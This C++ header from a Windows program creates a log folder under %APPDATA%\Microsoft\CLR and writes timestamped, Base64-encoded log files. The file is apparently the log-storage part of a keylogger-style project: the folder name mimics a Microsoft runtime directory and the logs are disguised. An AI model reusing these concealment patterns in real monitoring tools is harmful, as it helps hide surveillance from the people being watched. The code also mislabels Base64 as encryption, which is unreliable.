#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>  // for the get-environment function
#include <fstream>
#include "windows.h"    // the Windows API header
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOurPath(const bool append_separator = false) // append separator = if the backslash is included at the end of our path
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";    // backslash = escape character = have 2 to get 1

        return full + (append_separator ? "\\" : "");
    }

    bool MkOneDr(std::string path)  // this function fails in a C:\Users\User\Downloads or a C:\Users\\Downloads scenario
    {
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std::string path)
    {
        for(char &c : path)
        {
            if(c == '\\')   // like C:\Users\test\Downloads
            {
                c = '\0';
                if(!MkOneDr(path)) return false;
                c = '\\';
            }
        }

        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";   // we can't use ':' in Windows' file names, so we use '_' as separator

        try
        {
            std::ofstream file(path+name);
            if(!file) return "";    // if file cannot be opened or used, then return an empty string
            std::ostringstream s;
            // std::endl = flush the buffer and go into the new line
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
            // encrypt
            std::string data = Base64::EncryptB64(s.str());
            // dump string stream to the file
            file << data;
            if(!file) return ""; // if something has gone wrong with the file
            file.close();

            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}

#endif // IO_H
